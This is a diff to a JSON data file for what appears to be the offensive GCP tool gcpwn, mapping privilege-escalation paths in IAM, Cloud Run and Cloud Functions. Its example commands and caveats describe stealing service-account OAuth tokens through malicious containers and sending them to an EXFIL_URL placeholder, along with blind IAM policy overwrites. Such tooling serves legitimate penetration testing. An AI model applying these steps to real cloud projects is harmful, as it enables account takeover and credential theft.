@@ -122,16 +122,16 @@
         "general_caveats": [
           "Self-escalation: update a custom role your principal is already bound to, adding any permission (e.g. iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy); because you hold the role, the new permission becomes yours -- then exploit it (actAs -> CAN_CREATE_SA_ACCESS_TOKEN; setIamPolicy -> CAN_MODIFY_SA_IAM).",
           "Only a real escalation when the principal holds a binding to the custom role being updated; the graph gates this via prerequisite_binding=source_must_hold_custom_role (a principal holding iam.roles.update only via a predefined role is suppressed). The edge targets the resource where the custom-role binding is held (project-scope binding -> project target, SA-scope binding -> that SA, etc.).",
-          "The edge is defined by iam.roles.update alone, but the read-modify-write tools (the gcpwn module and gcloud --add-permissions) ALSO require iam.roles.get to read the role first; only the raw roles.patch REST call works with iam.roles.update alone. Live-validated.",
-          "GCP roles.patch REPLACES includedPermissions with exactly what you send (not an append). The gcpwn module and gcloud --add-permissions both do GetRole first, then patch with existing_perms + new_perm, so all existing permissions are preserved. Sending only the target permission via raw roles.patch silently wipes all other permissions on the role. Live-validated: gcpwn module preserved 9 existing permissions when adding a 10th; raw roles.patch with one permission left only that one.",
+          "The edge is defined by iam.roles.update alone, but the read-modify-write tools (the gcpwn module and gcloud --add-permissions) ALSO require iam.roles.get to read the role first; only the raw roles.patch REST call works with iam.roles.update alone..",
+          "GCP roles.patch REPLACES includedPermissions with exactly what you send (not an append). The gcpwn module and gcloud --add-permissions both do GetRole first, then patch with existing_perms + new_perm, so all existing permissions are preserved. Sending only the target permission via raw roles.patch silently wipes all other permissions on the role. Example: gcpwn module preserved 9 existing permissions when adding a 10th; raw roles.patch with one permission left only that one.",
           "Updating the role changes permissions for EVERY principal that holds a binding to it, not just the attacker. If the role has many holders, dropping permissions to minimize the payload (via raw roles.patch) may cause collateral breakage. The gcpwn module preserves existing permissions to avoid this.",
           "Logged as google.iam.admin.v1.UpdateRole in Cloud Audit Logs; adding high-value permissions to a widely-held custom role is high-signal."
         ],
         "example_gcpwn_command_caveats": [
-          "The module does a read-modify-write (GetRole then patch) with no blind fallback, so it needs iam.roles.get in addition to iam.roles.update; with only iam.roles.update it fails at GetRole with 403 'iam.roles.get'. Live-validated."
+          "The module does a read-modify-write (GetRole then patch) with no blind fallback, so it needs iam.roles.get in addition to iam.roles.update; with only iam.roles.update it fails at GetRole with 403 'iam.roles.get'.."
         ],
         "example_gcloud_command_caveats": [
-          "gcloud iam roles update --add-permissions reads the role first (iam.roles.get) before patching, so it needs iam.roles.get in addition to iam.roles.update. With only iam.roles.update, use the raw roles.patch REST call (example_curl_command). Live-validated."
+          "gcloud iam roles update --add-permissions reads the role first (iam.roles.get) before patching, so it needs iam.roles.get in addition to iam.roles.update. With only iam.roles.update, use the raw roles.patch REST call (example_curl_command).."
         ],
         "example_curl_command_caveats": [
           "roles.patch with updateMask=includedPermissions and a from-scratch list needs ONLY iam.roles.update, no iam.roles.get -- the minimum-permission path (confirmed HTTP 200). Since you cannot read the current role, include iam.roles.update plus your target permission; any other existing permissions on the role are dropped."
@@ -178,11 +178,11 @@
         "general_caveats": [
           "Two-step escalation: setIamPolicy to grant your attacker principal roles/iam.serviceAccountTokenCreator (or iam.serviceAccounts.getAccessToken) on the target SA, then mint a token for it (see CAN_CREATE_SA_ACCESS_TOKEN). No actAs required — tokenCreator is a separate mechanism.",
           "With ONLY setIamPolicy you cannot read the current policy (getIamPolicy is denied), so every method here BLIND-OVERWRITES the SA's IAM policy and replaces all existing bindings. Include existing bindings if you can enumerate them, or accept the clobber (possible lockout).",
-          "Live-validated: a principal holding only iam.serviceAccounts.setIamPolicy on the target SA granted itself tokenCreator then impersonated the SA, yielding full project admin (target held roles/owner).",
+          "A principal holding only iam.serviceAccounts.setIamPolicy on the target SA granted itself tokenCreator then impersonated the SA, yielding full project admin (target held roles/owner).",
           "Logged as google.iam.admin.v1.SetIAMPolicy on the service account; adding tokenCreator to an SA that holds elevated roles is high-signal."
         ],
         "example_gcpwn_command_caveats": [
-          "With only setIamPolicy the module's default read-modify-write (it calls getIamPolicy first) is denied; pass --overwrite to force a blind setIamPolicy, which replaces the SA's entire IAM policy. Live-validated."
+          "With only setIamPolicy the module's default read-modify-write (it calls getIamPolicy first) is denied; pass --overwrite to force a blind setIamPolicy, which replaces the SA's entire IAM policy.."
         ],
         "example_gcloud_command_caveats": [
           "Do NOT use `gcloud iam service-accounts add-iam-policy-binding` — it reads the policy first and also requires iam.serviceAccounts.getIamPolicy, which is PERMISSION_DENIED when you hold only setIamPolicy (confirmed live). Use `set-iam-policy` with a policy file instead.",
@@ -222,7 +222,7 @@
           "cloudfunctions.functions.setIamPolicy"
         ],
         "on": "cloudfunction",
-        "dead_end_note": "Function redeploy (the only way to inject code that exfils the SA token) requires actAs on the runtime SA — Cloud Functions backend returns PERMISSION_DENIED on any update without it. Invoking the existing function only executes its current code; the SA token is not returned by the HTTP response unless the function already leaks it. Code-injection attacks that DO get the SA token are covered under UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA (requires actAs).",
+        "dead_end_note": "Function redeploy (the only way to inject code that exfils the SA token) requires actAs on the runtime SA — Cloud Functions backend returns PERMISSION_DENIED on any update without it. Invoking the existing function only executes its current code; the SA token is not returned by the HTTP response unless the function already leaks it. Code-injection attacks that DO get the SA token are covered under UPDATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA / UPDATE_CLOUDRUN_SERVICE_FUNC_AS_SA (requires actAs).",
         "description": "Set the IAM policy on a Cloud Function. Updating (redeploying) the function requires actAs on the runtime SA and is blocked without it. You can invoke the existing function (trigger HTTP handler), but the response is just the function's existing output — SA token is NOT directly exposed unless the function already returns it. SA token theft via this path requires actAs on the attached SA.",
         "example_command": "gcloud functions set-iam-policy {target_resource} policy.json --project={project_id}",
         "status": "CONFIRMED",
@@ -508,7 +508,7 @@
       }
     },
     "cloudrun": {
-      "CREATE_CLOUDRUN_SERVICE_AS_SA": {
+      "CREATE_CLOUDRUN_SERVICE_IMAGE_AS_SA": {
         "requires": [
           {
             "permissions": [
@@ -517,7 +517,7 @@
             "on": "project"
           }
         ],
-        "edge": "CREATE_CLOUDRUN_SERVICE_AS_SA",
+        "edge": "CREATE_CLOUDRUN_SERVICE_IMAGE_AS_SA",
         "via": "capability",
         "act_as": {
           "permissions": [
@@ -525,12 +525,18 @@
           ],
           "on": "service-account"
         },
-        "description": "Deploy a Cloud Run service bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token. actAs IS required at service creation time. Minimum: run.services.create + actAs; artifactregistry.repositories.downloadArtifacts only needed when pulling from AR (not required with public Docker Hub images).",
-        "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --invoke --cleanup",
-        "status": "CONFIRMED",
-        "actas_required": true
+        "description": "Deploy a Cloud Run service bound to the target SA to execute arbitrary code and exfiltrate the SA's OAuth token. The exploit container exfils at startup in a background thread — no run.routes.invoke is needed. Cloud Run's default health check is TCP-only (port-open); no HTTP GET is ever sent automatically, so the exfil must be in a startup thread rather than a request handler. Minimum: run.services.create + actAs on runtime SA. Use an attacker-controlled external image to avoid needing any AR permissions in the target project..",
+        "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --cleanup",
+        "status": "VALIDATED",
+        "actas_required": true,
+        "caveats": [
+          "EXFIL MECHANISM : Cloud Run's default health check is TCP-only — it only opens a TCP connection to the container port, it does NOT send an HTTP GET request. Therefore token exfil must happen in a startup background thread (not a do_GET handler) for the attack to work without run.routes.invoke. The exploit_payloads._python_service_code and _nodejs_service_code builders fire exfil in a startup thread AND in the HTTP request handler. Token appears in Cloud Logging ~2s after TCP probe succeeds.",
+          "IMAGE AR PERMISSIONS: The Cloud Run V2 REST API checks at deploy time that the CALLER has artifactregistry.repositories.downloadArtifacts on the IMAGE'S repo — wherever it lives. If the image is in the TARGET project's AR, the caller needs that perm in the target project. If the image is in an ATTACKER-CONTROLLED external repo (different project), the attacker grants themselves access there and needs NO AR perms in the target project. The check is on the image's actual repo location, not the target project. Confirmed via 403 error specifying external repo path (2026-11-23). Public/anonymous images require no AR perms anywhere.",
+          "CLOUD RUN SERVICE AGENT: The Cloud Run service agent (service-PROJECTNUM@serverless-robot-prod.iam.gserviceaccount.com) in the target project must be able to PULL the image at runtime. For images in an external private AR repo, grant the service agent roles/artifactregistry.reader on that external repo — this is an attacker-side setup step, not a permission the attacker needs in the target project.",
+          "gcloud CLI EXTRAS (not true API requirements): run.services.get (pre-flight to check if service exists), resourcemanager.projects.get (project pre-flight). These are gcloud pre-flights — the Cloud Run V2 REST API itself does not require them."
+        ]
       },
-      "UPDATE_CLOUDRUN_SERVICE_AS_SA": {
+      "UPDATE_CLOUDRUN_SERVICE_IMAGE_AS_SA": {
         "requires": [
           {
             "permissions": [
@@ -539,7 +545,7 @@
             "on": "cloudrunservice"
           }
         ],
-        "edge": "UPDATE_CLOUDRUN_SERVICE_AS_SA",
+        "edge": "UPDATE_CLOUDRUN_SERVICE_IMAGE_AS_SA",
         "via": "capability",
         "act_as": {
           "permissions": [
@@ -547,11 +553,17 @@
           ],
           "on": "service-account"
         },
-        "description": "Update an existing Cloud Run service to swap in a malicious container image bound to the target SA, then invoke it to exfiltrate the SA's OAuth token from the GCE metadata endpoint.",
-        "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://EXFIL_URL --invoke --cleanup",
+        "description": "Update an existing Cloud Run service to swap in a malicious container image (and optionally change the runtime SA) to exfiltrate the SA's OAuth token. The exploit container exfils at startup in a background thread — no run.routes.invoke is needed. actAs on the CURRENT service SA is ALWAYS required for any update — including image-only updates..",
+        "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://EXFIL_URL --cleanup",
         "requires_resource_exists": true,
-        "status": "CONFIRMED",
-        "capability_resource_type": "cloudrunservice"
+        "status": "VALIDATED",
+        "capability_resource_type": "cloudrunservice",
+        "caveats": [
+          "ACTAS ALWAYS REQUIRED : Unlike Cloud Run Jobs (where image-only update needs no actAs), Cloud Run Services ALWAYS require actAs on the CURRENT service SA — even for image-only updates that do not change serviceAccountName. The Cloud Run V2 API returns PERMISSION_DENIED on iam.serviceaccounts.actAs for the service's current SA on any PATCH, regardless of whether the SA field is in the update mask. actAs on only the NEW SA is sufficient when changing the service account; if not changing SA, actAs on the existing SA is required.",
+          "IMAGE AR PERMISSIONS: Same check as CREATE — the Cloud Run V2 REST API validates caller has artifactregistry.repositories.downloadArtifacts on the IMAGE'S repo wherever it lives. If the image is in the target project's AR, the perm is needed there. If image is in an attacker-controlled external repo, the attacker grants themselves access there — no AR perms needed in the target project. Public images require no AR perms anywhere.",
+          "The container must listen on $PORT and pass Cloud Run's TCP startup probe (port must be open and accepting connections); a container that exits or never binds the port causes the deployment to fail even if IAM is correct. No HTTP GET is sent during deployment.",
+          "gcloud CLI EXTRAS (not true API requirements): run.services.get (pre-flight), resourcemanager.projects.get (project pre-flight). The Cloud Run V2 REST API itself does not require these."
+        ]
       },
       "CREATE_AND_INVOKE_CLOUDRUN_JOB_AS_SA": {
         "requires": [
@@ -571,10 +583,10 @@
           ],
           "on": "service-account"
         },
-        "description": "Create and execute a Cloud Run Job bound to the target SA, running arbitrary container code that steals the SA's OAuth token from the GCE metadata endpoint.",
+        "description": "Create and execute a Cloud Run Job bound to the target SA, running arbitrary container code that steals the SA's OAuth token from the GCE metadata endpoint. Minimum: run.jobs.create + run.jobs.run + actAs on the target SA..",
         "example_command": "modules run exploit_cloudrun_job_as_sa --target-sa {target_sa} --exfil-url https://EXFIL_URL",
         "capability_resource_type": "cloudrunjob",
-        "status": "CONFIRMED"
+        "status": "VALIDATED"
       },
       "UPDATE_AND_INVOKE_CLOUDRUN_JOB_AS_SA": {
         "requires": [
@@ -594,11 +606,15 @@
           ],
           "on": "service-account"
         },
-        "description": "Update an existing Cloud Run Job to replace its container image and service account with the target SA, then execute it to steal the SA's OAuth token via the GCE metadata endpoint.",
+        "description": "Update an existing Cloud Run Job to replace its container image with a malicious exfil image, then execute it to steal the SA's OAuth token via the GCE metadata endpoint. actAs on the target SA is only required if changing the job's service account; if the job already runs as the target SA, only run.jobs.update + run.jobs.run are needed. Min perms with SA unchanged = run.jobs.update + run.jobs.run (no actAs).",
         "example_command": "modules run exploit_cloudrun_job_as_sa --target-sa {target_sa} --update-existing --job-name EXISTING_JOB --exfil-url https://EXFIL_URL",
         "requires_resource_exists": true,
         "capability_resource_type": "cloudrunjob",
-        "status": "CONFIRMED"
+        "status": "VALIDATED",
+        "caveats": [
+          "actAs on the target SA is NOT required if only updating the container image (SA stays the same). Minimum perms for image-only update: run.jobs.update + run.jobs.run. actAs is only required if also changing the job's serviceAccountName..",
+          "The graph requires actAs as a conservative default (SA change case). For jobs already bound to the target SA, the edge fires without actAs in practice."
+        ]
       },
       "CREATE_CLOUDRUN_WORKERPOOL_AS_SA": {
         "requires": [
@@ -703,7 +719,7 @@
           "run.services.setIamPolicy"
         ],
         "on": "cloudrunservice",
-        "dead_end_note": "Service UPDATE/redeploy to inject token-exfil code requires actAs on the runtime SA — Cloud Run backend returns PERMISSION_DENIED on any image or code change without it. Invoking the existing service only executes its current handler; the SA token is not returned in the HTTP response unless the service already leaks it. Code-injection attacks are covered under UPDATE_CLOUDRUN_SERVICE_AS_SA (requires actAs).",
+        "dead_end_note": "Service UPDATE/redeploy to inject token-exfil code requires actAs on the runtime SA — Cloud Run backend returns PERMISSION_DENIED on any image or code change without it. Invoking the existing service only executes its current handler; the SA token is not returned in the HTTP response unless the service already leaks it. Code-injection attacks are covered under UPDATE_CLOUDRUN_SERVICE_IMAGE_AS_SA (requires actAs).",
         "description": "Set the IAM policy on a Cloud Run Service. Updating/redeploying the service requires actAs on the runtime SA and is blocked without it. You CAN grant yourself roles/run.admin and invoke the existing service (HTTP requests trigger the service handler, which runs as the attached SA). SA token is NOT directly returned via invocation unless the service code explicitly exposes it. Useful for: making the service public (allUsers invoker), triggering existing functionality, or reading service config. SA token theft via this path requires actAs on the attached SA.",
         "example_command": "gcloud run services set-iam-policy {target_resource} policy.json --region=REGION --project={project_id}  # then: curl -H 'Authorization: Bearer TOKEN' https://SERVICE_URL/",
         "status": "CONFIRMED",
@@ -750,7 +766,7 @@
       }
     },
     "cloudfunctions": {
-      "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
+      "CREATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA": {
         "requires": [
           {
             "permissions": [
@@ -763,25 +779,41 @@
               "cloudfunctions.functions.call"
             ],
             "on": "cloudfunction"
+          },
+          {
+            "id": "build_sa",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ],
+            "on": "service-account",
+            "resource_metadata_require": {
+              "is_cf_build_capable": true
+            }
           }
         ],
-        "edge": "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
+        "edge": "CREATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA",
         "via": "capability",
         "act_as": {
           "permissions": [
             "iam.serviceAccounts.actAs"
           ],
-          "on": "service-account",
-          "resource_metadata_require": {
-            "is_cf_build_capable": true
-          }
+          "on": "service-account"
         },
-        "description": "Deploy a new Cloud Function gen1 using a build-capable SA (via buildServiceAccount) as the runtime SA, then invoke it to exfiltrate the SA's OAuth token. The target SA must have the 4 CF gen1 build SA minimum permissions (artifactregistry.repositories.downloadArtifacts/uploadArtifacts + storage.objects.create/get), satisfied by roles/cloudbuild.builds.builder, roles/editor, or roles/owner. Caller only needs cloudfunctions.functions.create + call when using sourceArchiveUrl; cloudfunctions.functions.sourceCodeSet is only required for the upload-URL source path.",
+        "description": "Deploy a new Cloud Function gen1 (source-code path) with an explicit buildServiceAccount (build SA) and a separate runtime SA (target), then invoke it to exfiltrate the runtime SA's OAuth token. INVOKE IS REQUIRED: unlike FUNC/IMAGE Cloud Run edges, CF V1 is NOT backed by Cloud Run — the container cold-starts on the first HTTP invocation, so no code runs at deploy time. Attacker needs: cloudfunctions.functions.create + cloudfunctions.functions.call + actAs(build SA, is_cf_build_capable) + actAs(runtime SA). Minimum build SA perms: artifactregistry.repositories.downloadArtifacts + uploadArtifacts + logging.logEntries.create (external source bucket path)..",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --exfil-url https://EXFIL_URL",
         "capability_resource_type": "cloudfunction",
-        "status": "VALIDATED"
+        "status": "VALIDATED",
+        "caveats": [
+          "The build SA and runtime SA are SEPARATE SAs. The runtime SA needs zero build permissions — only the build SA needs build perms (is_cf_build_capable)..",
+          "MINIMUM BUILD SA PERMS (external source bucket): artifactregistry.repositories.downloadArtifacts, artifactregistry.repositories.uploadArtifacts, logging.logEntries.create. Only 3 perms needed in the target project. storage.objects.get, storage.objects.create, storage.objects.list, storage.buckets.get, artifactregistry.repositories.get/list are all NOT required. Satisfied by roles/cloudbuild.builds.builder (superset).",
+          "EXTERNAL BUCKET SETUP (attacker side): host source zip in an attacker-controlled bucket (any project). Grant the build SA objectViewer on that external bucket. Also grant the CF service agent (service-PROJECT_NUMBER@gcf-admin-robot.iam.gserviceaccount.com) and the attacker SA objectViewer on the external bucket (CF API preflight checks caller has storage.objects.get on the source URL). No storage IAM bindings needed in the target project.",
+          "If source is hosted WITHIN the target project bucket, additionally add storage.objects.get + storage.objects.create (5 perms total). This is NOT required for the external bucket path.",
+          "cloudfunctions.functions.sourceCodeSet is NOT required when using sourceArchiveUrl (direct GCS reference); only needed for the gcloud upload-URL path (generateUploadUrl).",
+          "WHY INVOKE IS REQUIRED (contrast with FUNC/IMAGE edges): CF V1 uses Google's original Functions infrastructure, not Cloud Run. The execution environment does NOT start at deploy time — it cold-starts on the first HTTP invocation. Module-level Python code and startup threads only run when the function is actually called. Compare: CREATE_CLOUDRUN_SERVICE_FUNC_AS_SA and CREATE_CLOUDRUN_SERVICE_IMAGE_AS_SA both fire startup threads at deploy time because Cloud Run always starts one container instance during DEPLOYMENT_ROLLOUT.",
+          "Alternative (not modeled by this edge): omit buildServiceAccount entirely — the default Cloud Build SA handles the build and the attacker only needs actAs on the runtime SA. This edge requires the explicit two-SA path."
+        ]
       },
-      "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
+      "UPDATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA": {
         "requires": [
           {
             "permissions": [
@@ -794,9 +826,19 @@
               "cloudfunctions.functions.call"
             ],
             "on": "cloudfunction"
+          },
+          {
+            "id": "build_sa",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ],
+            "on": "service-account",
+            "resource_metadata_require": {
+              "is_cf_build_capable": true
+            }
           }
         ],
-        "edge": "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
+        "edge": "UPDATE_AND_INVOKE_CLOUDFUNCTION_V1_AS_SA",
         "via": "capability",
         "act_as": {
           "permissions": [
@@ -804,11 +846,97 @@
           ],
           "on": "service-account"
         },
-        "description": "Update an existing Cloud Function gen1 to swap its runtime SA and/or source code, then invoke it to exfiltrate the target SA's OAuth token. Minimum: cloudfunctions.functions.update + cloudfunctions.functions.call + iam.serviceAccounts.actAs on the new runtime SA. cloudfunctions.functions.sourceCodeSet is NOT required when using sourceArchiveUrl (direct GCS reference); it is only required for the gcloud-default upload-URL source path (generateUploadUrl). actAs on the existing buildServiceAccount may also be required if the function build triggers Cloud Build with a custom buildServiceAccount.",
+        "description": "Update an existing Cloud Function gen1 (source-code path) with a new buildServiceAccount (build SA) and/or runtime SA, then invoke it to exfiltrate the runtime SA's OAuth token. INVOKE IS REQUIRED: CF V1 is not Cloud Run-backed; the container cold-starts on first invocation, so no code runs at deploy time. Attacker needs: cloudfunctions.functions.update + cloudfunctions.functions.call + actAs(build SA, is_cf_build_capable) + actAs(runtime SA). Minimum build SA perms: artifactregistry.repositories.downloadArtifacts + uploadArtifacts + logging.logEntries.create (external source bucket path)..",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --exfil-url https://EXFIL_URL",
         "requires_resource_exists": true,
         "capability_resource_type": "cloudfunction",
-        "status": "VALIDATED"
+        "status": "VALIDATED",
+        "caveats": [
+          "Same two-SA model as CREATE: build SA and runtime SA are DISTINCT. Runtime SA needs no build permissions..",
+          "Minimum build SA permissions (external source bucket): artifactregistry.repositories.downloadArtifacts, artifactregistry.repositories.uploadArtifacts, logging.logEntries.create. See CREATE edge caveats for full external-bucket setup and in-target-project storage fallback.",
+          "If the existing function already has a buildServiceAccount configured, the attacker must have actAs on that existing build SA (or override it to a build SA they control); overriding requires write access to the buildServiceAccount field which is part of cloudfunctions.functions.update.",
+          "cloudfunctions.functions.sourceCodeSet is NOT required when using sourceArchiveUrl (direct GCS reference).",
+          "WHY INVOKE IS REQUIRED (contrast with FUNC/IMAGE edges): CF V1 uses Google's original Functions infrastructure, not Cloud Run. The execution environment does NOT start at deploy time — it cold-starts on the first HTTP invocation. Module-level Python code and startup threads only run when the function is actually called. Compare: UPDATE_CLOUDRUN_SERVICE_FUNC_AS_SA and UPDATE_CLOUDRUN_SERVICE_IMAGE_AS_SA both fire startup threads at deploy time because Cloud Run always creates a new revision during update."
+        ]
+      },
+      "CREATE_CLOUDRUN_SERVICE_FUNC_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudfunctions.functions.create"
+            ],
+            "on": "cloudfunction"
+          },
+          {
+            "id": "build_sa",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ],
+            "on": "service-account",
+            "resource_metadata_require": {
+              "is_cf_v2_build_capable": true
+            }
+          }
+        ],
+        "edge": "CREATE_CLOUDRUN_SERVICE_FUNC_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Deploy a new Cloud Functions gen2 function bound to the target SA to exfiltrate the SA's OAuth token. CF V2 is backed by Cloud Run; Cloud Run starts the container during deployment for the TCP health check. Module-level Python code (outside the handler) runs at import time — a startup background thread fires immediately, fetching the metadata token and exfilling it without any HTTP invocation. Minimum: cloudfunctions.functions.create + actAs on BOTH the runtime SA AND the build SA. run.routes.invoke is NOT required..",
+        "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --gen2 --exfil-url https://EXFIL_URL",
+        "capability_resource_type": "cloudfunction",
+        "status": "VALIDATED",
+        "caveats": [
+          "EXFIL MECHANISM — NO INVOKE NEEDED : CF V2 is backed by Cloud Run. Cloud Run starts the container during DEPLOYMENT_ROLLOUT to run the TCP health check (not HTTP). Module-level Python code fires at import time, before any request handler is called. A startup background thread fetches the GCE metadata token and POSTs it to the exfil URL — this fires 2-3 seconds after the TCP probe succeeds, with zero HTTP invocations. [EXFIL] log line confirmed in Cloud Run logs before any explicit invocation.",
+          "TWO-SA MODEL : CF V2 requires actAs on BOTH (1) the runtime SA and (2) the build SA. The build SA defaults to the Compute Engine default SA ({project-number}-compute@developer.gserviceaccount.com) when --build-service-account is not specified — use `gcloud builds get-default-service-account --project=PROJECT` to find it. If the attacker specifies --build-service-account to a custom SA they control, they need actAs on THAT SA instead.",
+          "No run.services.create required — the Cloud Functions v2 API provisions the backing Cloud Run service automatically.",
+          "Unlike gen1, the function's URL is a Cloud Run URL (run.app domain); the Cloud Functions API does not expose a separate call endpoint. Gen2 functions do NOT use cloudfunctions.functions.call.",
+          "gcloud CLI EXTRAS (not true API requirements): cloudfunctions.functions.get (pre-flight to check if function exists), cloudfunctions.operations.get (gcloud polls operation status), resourcemanager.projects.get (project pre-flight), cloudbuild.googleapis.com defaultServiceAccount GET (gcloud fetches build SA before calling API). These are gcloud pre-flights — the CF V2 REST API itself does not require them."
+        ]
+      },
+      "UPDATE_CLOUDRUN_SERVICE_FUNC_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudfunctions.functions.update"
+            ],
+            "on": "cloudfunction"
+          },
+          {
+            "id": "build_sa",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ],
+            "on": "service-account",
+            "resource_metadata_require": {
+              "is_cf_v2_build_capable": true
+            }
+          }
+        ],
+        "edge": "UPDATE_CLOUDRUN_SERVICE_FUNC_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Cloud Functions gen2 function to swap its runtime SA and/or source code to exfiltrate the target SA's OAuth token. Same startup-thread mechanism as CF V2 CREATE: on update Cloud Run creates a new revision, starts the container for the TCP health check, and module-level code fires at import time before any HTTP request. Minimum: cloudfunctions.functions.update + actAs on BOTH the runtime SA AND the build SA. run.routes.invoke is NOT required. The startup thread mechanism is identical to CF V2 CREATE — Cloud Run uses the same revision rollout process for updates.",
+        "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --gen2 --exfil-url https://EXFIL_URL",
+        "requires_resource_exists": true,
+        "capability_resource_type": "cloudfunction",
+        "status": "VALIDATED",
+        "caveats": [
+          "EXFIL MECHANISM — NO INVOKE NEEDED: Same as CF V2 CREATE. Cloud Run creates a new revision on function update, starts the container for the TCP health check, and module-level startup thread fires immediately. No HTTP invocation required.",
+          "TWO-SA MODEL : CF V2 UPDATE also requires actAs on BOTH (1) the runtime SA (new SA being assigned) and (2) the build SA. Same two-SA requirement as CF V2 CREATE. The build SA defaults to the Compute Engine default SA ({project-number}-compute@developer.gserviceaccount.com) when not specified — use `gcloud builds get-default-service-account --project=PROJECT` to find it. Attacker can override with --build-service-account to any SA they have actAs on.",
+          "Gen2 functions do NOT use cloudfunctions.functions.call. The backing Cloud Run endpoint exists but neither call nor invoke perm is needed when using the startup-thread exfil approach.",
+          "cloudfunctions.functions.sourceCodeSet is only required when using gcloud's upload-URL path (generateUploadUrl); sourceArchiveUrl (direct GCS reference) only needs cloudfunctions.functions.update.",
+          "gcloud CLI EXTRAS (not true API requirements): cloudfunctions.functions.get (pre-flight), run.services.get (pre-flight for the backing Cloud Run service), resourcemanager.projects.get (project pre-flight). These are gcloud pre-flights — the CF V2 REST API itself does not require them."
+        ]
       }
     },
     "cloudbuild": {
